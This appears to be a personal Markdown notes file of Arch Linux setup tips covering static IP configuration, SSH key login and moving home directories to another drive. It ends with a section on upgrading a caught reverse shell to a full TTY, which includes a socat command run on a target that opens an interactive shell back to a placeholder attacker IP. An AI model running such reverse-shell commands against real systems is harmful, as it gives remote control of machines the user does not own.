# Quality of Life — Arch / Arch-based

Practical setup tips for daily use on Arch and Arch-based distros.

---

## Static IP (NetworkManager)

Identify the network interface:

```bash
nmcli device
```

Edit the connection (replace `enp108s0` with your interface):

```bash
nmcli connection edit enp108s0
```

Inside the editor:

```
set ipv4.method manual
set ipv4.addresses 172.16.0.11/24
set ipv4.gateway 172.16.0.1
set ipv4.dns "1.1.1.1 8.8.8.8"
save
quit
```

Activate:

```bash
nmcli connection up enp108s0
```

Verify:

```bash
ip addr show enp108s0
```

---

## SSH Setup

**Goal:** secure, passwordless SSH login using key authentication.

### Install and Enable

```bash
sudo pacman -S openssh
sudo systemctl enable --now sshd
```

Verify the service is running:

```bash
sudo systemctl status sshd
ss -tlnp | grep :22
```

### Copy Public Key to Server

```bash
ssh-copy-id USER@IP
```

Enter the password once. The key is installed into `~/.ssh/authorized_keys` on the server.

### Test Passwordless Login

```bash
ssh USER@IP
```

### Disable Password Authentication

Only do this **after confirming key login works**.

```bash
sudo vim /etc/ssh/sshd_config
```

```
PasswordAuthentication no
PubkeyAuthentication yes
```

```bash
sudo systemctl restart sshd
```

### SSH Host Alias

```bash
vim ~/.ssh/config
```

```
Host SERVER
    HostName IP
    User USER
    IdentityFile ~/.ssh/id_ed25519
```

Connect with:

```bash
ssh SERVER
```

---

## Move Home Directories to a Separate Drive

Useful for offloading large directories (Git, Media, etc.) to a secondary SSD.

### Format the Drive

```bash
sudo mkfs.btrfs -f /dev/sdX
```

### Mount

```bash
sudo mkdir -p /media/$USER
sudo mount /dev/sdX /media/$USER
sudo chown $USER:$USER /media/$USER
```

### Create Directories

```bash
mkdir /media/$USER/{Documents,Git,Music,Pictures,Videos}
```

### Copy Data

```bash
sudo rsync -avh --progress ~/Documents/ /media/$USER/Documents/
sudo rsync -avh --progress ~/Git/       /media/$USER/Git/
sudo rsync -avh --progress ~/Music/     /media/$USER/Music/
sudo rsync -avh --progress ~/Pictures/  /media/$USER/Pictures/
sudo rsync -avh --progress ~/Videos/    /media/$USER/Videos/
```

> Verify the data before deleting originals.

### Remove Old Directories

```bash
rm -rf ~/Documents ~/Git ~/Music ~/Pictures ~/Videos
```

### Symlink Back

```bash
ln -s /media/$USER/Documents ~/Documents
ln -s /media/$USER/Git       ~/Git
ln -s /media/$USER/Music     ~/Music
ln -s /media/$USER/Pictures  ~/Pictures
ln -s /media/$USER/Videos    ~/Videos
```

### Persist in fstab

Get the drive UUID:

```bash
lsblk -f /dev/sdX
```

Add to `/etc/fstab`:

```
UUID=<UUID>  /media/<youruser>  btrfs  defaults,noatime,compress=zstd  0  2
```

> Consider adding a Snapper config for the mount point as a safety net.

---

## Upgrade a Dumb Shell to a Full TTY

When you catch a reverse shell, it's often a limited "dumb" shell — no tab completion, no history, Ctrl-C kills the connection.

### Method 1 — Python PTY (quick)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Handles `su` and gives a nicer prompt, but still no job control or tab completion.

### Method 2 — Full TTY via stty

After spawning a Python PTY:

```bash
# Inside the reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell and fix terminal settings on your local machine:

```
Ctrl-Z
stty raw -echo; fg
```

Then inside the shell:

```bash
export TERM=xterm-256color
stty rows 40 cols 160
```

Now you have full TTY — tab completion, history, Ctrl-C, and `vim` all work.

### Method 3 — socat (best, if available)

On your machine (listener):

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On the target:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR_IP>:4444
```

Full interactive TTY over the connection.
